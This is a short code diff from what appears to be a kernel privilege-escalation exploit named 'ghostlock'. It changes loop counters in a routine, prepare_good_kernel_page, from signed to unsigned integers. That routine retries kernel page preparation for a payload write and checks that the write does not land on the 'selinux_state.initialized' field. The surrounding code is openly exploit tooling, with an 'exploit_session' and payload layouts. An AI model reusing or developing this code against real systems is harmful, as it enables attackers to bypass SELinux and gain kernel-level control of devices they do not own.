@@ -692,7 +692,7 @@ namespace ghostlock::support {
     }
 
     uintptr_t prepare_good_kernel_page(const memory::WriteRequest &request) {
-        int32_t max_attempts = session::g_exploit_session.profile.heap_prepare_max_attempts();
+        uint32_t max_attempts = session::g_exploit_session.profile.heap_prepare_max_attempts();
         struct timespec t_good;
         clock_gettime(CLOCK_MONOTONIC, &t_good);
         struct timespec deadline = t_good;
@@ -704,7 +704,7 @@ namespace ghostlock::support {
             deadline.tv_sec++;
             deadline.tv_nsec -= 1000000000L;
         }
-        for (int32_t attempt = 1; attempt <= max_attempts; attempt++) {
+        for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
             uintptr_t base = prepare_kernel_page(&request);
             if (base) {
                 memory::PayloadWriteLayout layout = {
@@ -720,7 +720,7 @@ namespace ghostlock::support {
                     pr_warning("page %016zx stores an even byte over "
                                "selinux_state.initialized; taking another\n", base);
                 } else {
-                    pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
+                    pr_info("prepare_kernel_page ok attempt=%u +%lldms\n", attempt,
                             ms_since(&t_good));
                     return base;
                 }
@@ -729,10 +729,10 @@ namespace ghostlock::support {
             clock_gettime(CLOCK_MONOTONIC, &now);
             if (now.tv_sec > deadline.tv_sec ||
                 (now.tv_sec == deadline.tv_sec && now.tv_nsec >= deadline.tv_nsec)) {
-                pr_warning("prepare_kernel_page timeout after %d attempts\n", attempt);
+                pr_warning("prepare_kernel_page timeout after %u attempts\n", attempt);
                 break;
             }
-            pr_warning("prepare_kernel_page retry %d/%d +%lldms\n", attempt,
+            pr_warning("prepare_kernel_page retry %u/%u +%lldms\n", attempt,
                        max_attempts, ms_since(&t_good));
         }
         return 0;
